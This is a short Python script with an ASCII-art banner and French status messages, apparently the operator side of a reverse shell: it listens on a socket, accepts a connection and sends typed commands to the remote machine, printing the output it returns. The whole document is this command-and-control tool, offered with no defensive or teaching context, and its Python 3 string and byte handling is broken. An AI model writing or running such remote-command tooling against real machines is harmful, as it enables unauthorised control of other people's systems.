#!/usr/bin/python3
print("""\n\n\n   _____   __  .__.__  .__               
  /  _  \_/  |_|__|  | |__|____    ____  
 /  /_\  \   __\  |  | |  \__  \  /    \ 
/    |    \  | |  |  |_|  |/ __ \|   |  \\
\____|__  /__| |__|____/__(____  /___|  /
        \/                     \/     \/ \n\n\n""")

import socket, subprocess as sp, sys

host = str("127.0.0.1")
port = int(8000)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host, port))
s.listen(5)
print ("Listening en cours sur %s : %d" %(host, port))
conn, addr = s.accept()

print ("[+] Connexion etablie avec l'hote : %s" %(str(addr[0])))

while 1:
    command = input("#> ")
    if command != "exit()":
        if command == "":continue
        conn.send(command)
        result = conn.recv(1024)
        total_size = int(result[:16])
        result = result[16:]

        while total_size > len(result):
            data = conn.recv(1024)
            result += data
        print (result.rstrip("\n"))
    else :
        conn.send("exit()")
        print ("[+] Connexion fermer")
        break

s.close()